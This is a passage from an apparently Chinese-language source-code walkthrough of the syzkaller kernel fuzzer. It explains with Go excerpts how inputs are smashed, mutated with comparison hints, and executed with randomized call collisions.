proc.smashInput()：执行并变异刚刚被加入到语料库中的程序【核心】"></a>③ proc.smashInput()：执行并变异刚刚被加入到语料库中的程序【核心】</h3><p><code>proc.smashInput()</code> 用以<strong>执行并变异刚刚被加入到语料库中的程序</strong>（即 <code>WorkSmash</code> ）：</p><ul><li>首先检查 <code>faultInjectionEnabled</code> ，若设置了则调用 <code>proc.failCall()</code> <ul><li>该函数用以将一个 fault 注入到程序中，其会循环一百次，设置 <code>newProg.Calls[call].Props.FailNth = nth</code> （<code>newProg</code> 为输入程序的克隆）后调用 <code>proc.executeRaw()</code> 进行执行</li></ul></li><li>接下来检查 <code>comparisonTracingEnabled</code> ，若设置了则调用 <code>proc.executeHintSeed()</code> <strong>使用 hint 进行变异</strong></li><li>随后获取 syz-fuzzer 当前快照，并循环一百次：<strong>调用</strong> <code>prog.Mutate()</code> <strong>将输入程序进行变异后再调用</strong> <code>proc.executeAndCollide()</code> <strong>执行变异后的程序</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> smashInput(item *WorkSmash) &#123;<br><span class="hljs-keyword">if</span> proc.fuzzer.faultInjectionEnabled &amp;&amp; item.call != <span class="hljs-number">-1</span> &#123;<br>proc.failCall(item.p, item.call)<br>&#125;<br><span class="hljs-keyword">if</span> proc.fuzzer.comparisonTracingEnabled &amp;&amp; item.call != <span class="hljs-number">-1</span> &#123;<br>proc.executeHintSeed(item.p, item.call)<br>&#125;<br>fuzzerSnapshot := proc.fuzzer.snapshot()<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>p := item.p.Clone()<br>p.Mutate(proc.rnd, prog.RecommendedCalls, proc.fuzzer.choiceTable, proc.fuzzer.noMutate, fuzzerSnapshot.corpus)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: smash mutated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatSmash)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>变异函数 <code>prog.Mutate()</code> 我们将在下一节中深入分析，本节我们先来看另外两个函数：</p><h4 id="proc-executeHintSeed-：使用-hint-变异程序并执行"><a href="#proc-executeHintSeed-：使用-hint-变异程序并执行" class="headerlink" title="proc.executeHintSeed()：使用 hint 变异程序并执行"></a>proc.executeHintSeed()：使用 hint 变异程序并执行</h4><p>该函数首先会将输入程序执行一次，接下来调用 <code>prog.MutateWithHints</code> 使用执行所得的 CompMap <strong>对输入程序中的一些参数值进行替换</strong>，最后再将该输入程序执行一次：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeHintSeed(p *prog.Prog, call <span class="hljs-type">int</span>) &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: collecting comparisons&quot;</span>, proc.pid)<br><span class="hljs-comment">// 首先执行原始程序以从 KCOV 获取比较值.</span><br>info := proc.execute(proc.execOptsComps, p, ProgNormal, StatSeed)<br><span class="hljs-keyword">if</span> info == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 接下来为每个系统调用参数于一个比较操作数的匹配对变异原始程序.</span><br><span class="hljs-comment">// 执行每一个这样的变异，以检查是否给出了新的覆盖率.</span><br>p.MutateWithHints(call, info.Calls[call].Comps, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *prog.Prog)</span></span> &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: executing comparison hint&quot;</span>, proc.pid)<br>proc.execute(proc.execOpts, p, ProgNormal, StatHint)<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>MutateWithHints()</code> 当中输入进程会先被克隆一份，接下来使用 <code>ForeachArg</code> 遍历指定系统调用中的每个参数，并传入了一些闭包函数套娃（套中套中套属于是）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 使用存储在 compMaps中的比较操作数变异程序.</span><br><span class="hljs-comment">// 对于每个变种，执行 exec 回调.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> MutateWithHints(callIndex <span class="hljs-type">int</span>, comps CompMap, exec <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Prog)</span></span>) &#123;<br>p = p.Clone()<br>c := p.Calls[callIndex]<br>execValidate := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 不要尝试修复 candidate 程序.</span><br><span class="hljs-comment">// 假设原来的调用被 sanitized, 我们会得到一个坏的调用作为 hint 的替代结果，将其丢掉就行.</span><br><span class="hljs-keyword">if</span> p.Target.sanitize(c, <span class="hljs-literal">false</span>) != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>p.debugValidate()<br>exec(p)<br>&#125;<br>ForeachArg(c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, _ *ArgCtx)</span></span> &#123;<br>generateHints(comps, arg, execValidate)<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>类似于我们上文分析的 <code>ForeachType()</code>，<code>ForeachArg()</code> 会为该调用的返回值与每一个参数都调用 <code>foreachArgImpl()</code>，该函数首先会调用上层传入的闭包 <code>generateHints()</code>，接下来会根据参数类型进行不同操作：</p><ul><li><code>GroupArg</code> （逻辑上的一组参数，即<strong>结构体</strong>与<strong>数组</strong>）：获取并遍历其中的每个成员，递归调用 <code>foreachArgImpl()</code></li><li><code>PointerArg</code> （指针类型）：判断其指向 （pointee）是否为 nil，若否，递归调用 <code>foreachArgImpl()</code></li><li><code>UnionArg</code>  （联合体类型）：递归调用 <code>foreachArgImpl()</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ForeachArg</span><span class="hljs-params">(c *Call, f <span class="hljs-keyword">func</span>(Arg, *ArgCtx)</span></span>) &#123;<br>ctx := &amp;ArgCtx&#123;&#125;<br><span class="hljs-keyword">if</span> c.Ret != <span class="hljs-literal">nil</span> &#123;<br>foreachArgImpl(c.Ret, ctx, f)<br>&#125;<br>ctx.Parent = &amp;c.Args<br>ctx.Fields = c.Meta.Args<br><span class="hljs-keyword">for</span> _, arg := <span class="hljs-keyword">range</span> c.Args &#123;<br>foreachArgImpl(arg, ctx, f)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foreachArgImpl</span><span class="hljs-params">(arg Arg, ctx *ArgCtx, f <span class="hljs-keyword">func</span>(Arg, *ArgCtx)</span></span>) &#123;<br>ctx0 := *ctx<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; *ctx = ctx0 &#125;()<br>f(arg, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">switch</span> a := arg.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *GroupArg:<br>overlayField := <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> typ, ok := a.Type().(*StructType); ok &#123;<br>ctx.Parent = &amp;a.Inner<br>ctx.Fields = typ.Fields<br>overlayField = typ.OverlayField<br>&#125;<br><span class="hljs-keyword">var</span> totalSize <span class="hljs-type">uint64</span><br><span class="hljs-keyword">for</span> i, arg1 := <span class="hljs-keyword">range</span> a.Inner &#123;<br><span class="hljs-keyword">if</span> i == overlayField &#123;<br>ctx.Offset = ctx0.Offset<br>&#125;<br>foreachArgImpl(arg1, ctx, f)<br>size := arg1.Size()<br>ctx.Offset += size<br><span class="hljs-keyword">if</span> totalSize &lt; ctx.Offset &#123;<br>totalSize = ctx.Offset - ctx0.Offset<br>&#125;<br>&#125;<br>claimedSize := a.Size()<br>varlen := a.Type().Varlen()<br><span class="hljs-keyword">if</span> varlen &amp;&amp; totalSize &gt; claimedSize || !varlen &amp;&amp; totalSize != claimedSize &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;bad group arg size %v, should be &lt;= %v for %#v type %#v&quot;</span>,<br>totalSize, claimedSize, a, a.Type().Name()))<br>&#125;<br><span class="hljs-keyword">case</span> *PointerArg:<br><span class="hljs-keyword">if</span> a.Res != <span class="hljs-literal">nil</span> &#123;<br>ctx.Base = a<br>ctx.Offset = <span class="hljs-number">0</span><br>foreachArgImpl(a.Res, ctx, f)<br>&#125;<br><span class="hljs-keyword">case</span> *UnionArg:<br>foreachArgImpl(a.Option, ctx, f)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们来看 <code>generateHints()</code> 函数，该函数首先会调用 <code>Arg</code> 接口的 <code>Type()</code> 函数获取类型并进行判断，对于大部分类型好像都是直接返回，仅有以下通过：</p><ul><li><code>ConstType</code>：会检查 <code>IsPad</code> 标志位，若不为真才会继续</li><li><code>BufferType</code> 中的 <code>BufferString, BufferGlob</code>：会检查值的长度，为 0 才会继续</li><li>其他的不在如下代码中的类型</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">generateHints</span><span class="hljs-params">(compMap CompMap, arg Arg, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>typ := arg.Type()<br><span class="hljs-keyword">if</span> typ == <span class="hljs-literal">nil</span> || arg.Dir() == DirOut &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">switch</span> t := typ.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ProcType:<br><span class="hljs-comment">// 随机的程序不会通过验证.</span><br><span class="hljs-comment">// 我们可以将其变异，但仅当结果值在合法范围内.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> *ConstType:<br><span class="hljs-keyword">if</span> IsPad(typ) &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">case</span> *CsumType:<br><span class="hljs-comment">// Csum 将不会通过验证，且总会被计算.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> *BufferType:<br><span class="hljs-keyword">switch</span> t.Kind &#123;<br><span class="hljs-keyword">case</span> BufferFilename:<br><span class="hljs-comment">// 其可以生成逃逸路径，且通常不会太有用.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> BufferString, BufferGlob:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(t.Values) != <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 这些通常是文件名或完整的枚举。</span><br><span class="hljs-comment">// 若我们拦截 strcmp，将其变异可能是有用的</span><br><span class="hljs-comment">// (并过滤掉文件名).</span><br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 最后会根据参数实际的存储类型进行判断：</p><ul><li>对于常量参数 <code>ConstArg</code> 类型会调用 <code>checkConstArg()</code> 处理</li><li>对于数据参数 <code>DataArg</code> 类型，首先会判断是否为 <code>BufferCompressed</code> 类型，若是则调用 <code>checkCompressedArg()</code> ，否则调用 <code>checkDataArg()</code> 处理</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> a := arg.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ConstArg:<br>checkConstArg(a, compMap, exec)<br><span class="hljs-keyword">case</span> *DataArg:<br><span class="hljs-keyword">if</span> typ.(*BufferType).Kind == BufferCompressed &#123;<br>checkCompressedArg(a, compMap, exec)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>checkDataArg(a, compMap, exec)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这三个函数都会调用到 <code>shrinkExpand()</code>，所以我们先来看看这个函数的实现，该函数用以<strong>使用给定的 CompMap 对参数进行替换，返回结果为可以用来进行替换的新参数值</strong>，其具体实现我们就不深入了，这里来看注释：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Shrink and expand mutations 在当系统调用参数被转化为更狭窄（与更宽阔）的整型类型时</span><br><span class="hljs-comment">// 对这些情况进行建模.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 收缩的动机:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//void f(u16 x) &#123;</span><br><span class="hljs-comment">//u8 y = (u8)x;</span><br><span class="hljs-comment">//if (y == 0xab) &#123;...&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 若我们调用 f(0x1234), 我们将看到在 0x34 与 0xab 间的比较，</span><br><span class="hljs-comment">// 我们将没法将参数 0x1234 与任何比较操作数匹配.</span><br><span class="hljs-comment">// 由此我们将 0x1234 收缩到 0x34 并尝试匹配 0x34.</span><br><span class="hljs-comment">// 若对于收缩后的值存在一个匹配，则我们替换输入中相应的字节</span><br><span class="hljs-comment">//  (在给出的例子中我们将获得 0x12ab).</span><br><span class="hljs-comment">// 有的时候其他的比较操作数将比收缩后的值要宽</span><br><span class="hljs-comment">// (在上面的例子中考虑比较 if (y == 0xdeadbeef) &#123;...&#125;).</span><br><span class="hljs-comment">// 这种情况下我们忽略这样的比较因为我们无法给出做着类似事情的合法代码🌰.</span><br><span class="hljs-comment">// 为了避免这样的比较，我们我们使用 leastSize() 检查其 size. </span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 扩展的动机:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//void f(i8 x) &#123;</span><br><span class="hljs-comment">//i16 y = (i16)x;</span><br><span class="hljs-comment">//if (y == -2) &#123;...&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 假如我们调用 f(-1), 我们将看到在 0xffff 与 0xfffe 间的比较，</span><br><span class="hljs-comment">// 并无法将输入与任何操作数匹配. 由此我们对输入进行符号扩展并检查扩展.</span><br><span class="hljs-comment">// 与收缩一样，我们忽略了另一个操作数更宽的情况.</span><br><span class="hljs-comment">// 需要注意的是 executor 将所有的比较操作数符号扩展至 int64.</span><br></code></pre></td></tr></table></figure><p>下面我们来看这三个 <code>check*Arg()</code> ，我们首先看用来处理常量的 <code>checkConstArg()</code>，主要逻辑是嗲用 <code>shrinkExpand()</code> 并对其结果（<code>CompMap</code> 类型）进行遍历，将 <code>arg.Val</code> 依次替换为其提供的 replacer 值，并调用上层回调函数（也就是 <code>execValidate()</code> ，里面还会调用上层传入的闭包函数，最后会调用 <code>proc.execute()</code> ，也就是说<strong>对于 shrinkExpand() 提供的每个替换结果其都会执行一次</strong>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkConstArg</span><span class="hljs-params">(arg *ConstArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>original := arg.Val<br><span class="hljs-comment">// Note: because shrinkExpand returns a map, order of programs is non-deterministic.</span><br><span class="hljs-comment">// This can affect test coverage reports.</span><br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(original, compMap, arg.Type().TypeBitSize(), <span class="hljs-literal">false</span>) &#123;<br>arg.Val = replacer<br>exec()<br>&#125;<br>arg.Val = original<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来看 <code>checkCompressedArg()</code> ，主要就是将数据解压后逐 4 字节进行遍历，每次遍历时都会再调用 <code>shrinkExpand()</code> 获取可替换值并再对其结果进行遍历，调用上层传入的闭包函数执行替换数据后的程序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkCompressedArg</span><span class="hljs-params">(arg *DataArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>data0 := arg.Data()<br>data, dtor := image.MustDecompress(data0)<br><span class="hljs-keyword">defer</span> dtor()<br><span class="hljs-comment">// Images are very large so the generic algorithm for data arguments</span><br><span class="hljs-comment">// can produce too many mutants. For images we consider only</span><br><span class="hljs-comment">// 4/8-byte aligned ints. This is enough to handle all magic</span><br><span class="hljs-comment">// numbers and checksums. We also ignore 0 and ^uint64(0) source bytes,</span><br><span class="hljs-comment">// because there are too many of these in lots of images.</span><br>bytes := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(data); i += <span class="hljs-number">4</span> &#123;<br>original := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-built_in">copy</span>(original, data[i:])<br>val := binary.LittleEndian.Uint64(original)<br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(val, compMap, <span class="hljs-number">64</span>, <span class="hljs-literal">true</span>) &#123;<br>binary.LittleEndian.PutUint64(bytes, replacer)<br><span class="hljs-built_in">copy</span>(data[i:], bytes)<br>arg.SetData(image.Compress(data))<br>exec()<br>&#125;<br><span class="hljs-built_in">copy</span>(data[i:], original)<br>&#125;<br>arg.SetData(data0)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>checkDataArg()</code> 逻辑基本上与 <code>checkCompressedArg()</code> 一致，不过是逐字节遍历且没有解压过程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkDataArg</span><span class="hljs-params">(arg *DataArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>bytes := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br>data := arg.Data()<br>size := <span class="hljs-built_in">len</span>(data)<br><span class="hljs-keyword">if</span> size &gt; maxDataLength &#123;<br>size = maxDataLength<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; size; i++ &#123;<br>original := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-built_in">copy</span>(original, data[i:])<br>val := binary.LittleEndian.Uint64(original)<br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(val, compMap, <span class="hljs-number">64</span>, <span class="hljs-literal">false</span>) &#123;<br>binary.LittleEndian.PutUint64(bytes, replacer)<br><span class="hljs-built_in">copy</span>(data[i:], bytes)<br>exec()<br>&#125;<br><span class="hljs-built_in">copy</span>(data[i:], original)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="proc-executeAndCollide-：简易的变异执行："><a href="#proc-executeAndCollide-：简易的变异执行：" class="headerlink" title="proc.executeAndCollide()：简易的变异执行："></a>proc.executeAndCollide()：简易的变异执行：</h4><p>该函数的逻辑比较简单，首先会将程序执行一次，之后循环执行两次，不过会调用 <code>proc.randomCollide()</code> 先将原始程序进行处理后再执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeAndCollide(execOpts *ipc.ExecOpts, p *prog.Prog, flags ProgTypes, stat Stat) &#123;<br>proc.execute(execOpts, p, flags, stat)<br><br><span class="hljs-keyword">if</span> proc.execOptsCollide.Flags&amp;ipc.FlagThreaded == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// We cannot collide syscalls without being in the threaded mode.</span><br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">const</span> collideIterations = <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; collideIterations; i++ &#123;<br>proc.executeRaw(proc.execOptsCollide, proc.randomCollide(p), StatCollide)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>randomCollide()</code> 流程如下：</p><ul><li>首先会有 20% 的几率调用 <code>prog.DoubleExecCollide()</code> （把源程序拷贝一份附加到其自身的末，并使用第一部分的资源），若未出错则直接返回</li><li>接下来有 20% 的几率调用 <code>prog.DupCallCollide()</code> （将程序中的部分调用进行复制并标记为异步），若未出错则直接返回</li><li>最后会调用 <code>prog.AssignRandomAsync()</code> （确保使用一个异步调用生产的资源的调用与其至少间隔一个非异步调用）并有 50% 的几率调用 <code>prog.AssignRandomRerun()</code>：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> randomCollide(origP *prog.Prog) *prog.Prog &#123;<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">5</span>) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Old-style collide with a 20% probability.</span><br>p, err := prog.DoubleExecCollide(origP, proc.rnd)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> p<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">4</span>) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Duplicate random calls with a 20% probability (25% * 80%).</span><br>p, err := prog.DupCallCollide(origP, proc.rnd)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> p<br>&#125;<br>&#125;<br>p := prog.AssignRandomAsync(origP, proc.rnd)<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">2</span>) != <span class="hljs-number">0</span> &#123;<br>prog.AssignRandomRerun(p, proc.rnd)<br>&#125;<br><span class="hljs-keyword">return</span> p<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="生成新输入-x2F-变异现有输入，执行"><a href="#生成新输入-x2F-变异现有输入，执行" class="headerlink" title="生成新输入&#x2F;变异现有输入，执行"></a>生成新输入&#x2F;变异现有输入，执行</h2><p>继续回到 <code>loop()</code> 的无限循环中，如果说全局 <code>WorkQueue</code> 空了，说明这个时候我们要自己想办法弄新的输入了，首先我们要获取 syz-fuzzer 当前的快照（其中包括语料库、语料库权重值、总的权重值），之后进行判断：</p><ul><li>若语料库为空，或是已经进行了 <code>generatePeriod</code> 次循环，此时调用 <code>target.Generate()</code> 生成新的输入程序</li><li>否则，选择一份现有的输入，调用 <code>prog.Mutate()</code> 将该输入进行变异，生成新的输入</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go">ct := proc.fuzzer.choiceTable<br>fuzzerSnapshot := proc.fuzzer.snapshot()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(fuzzerSnapshot.corpus) == 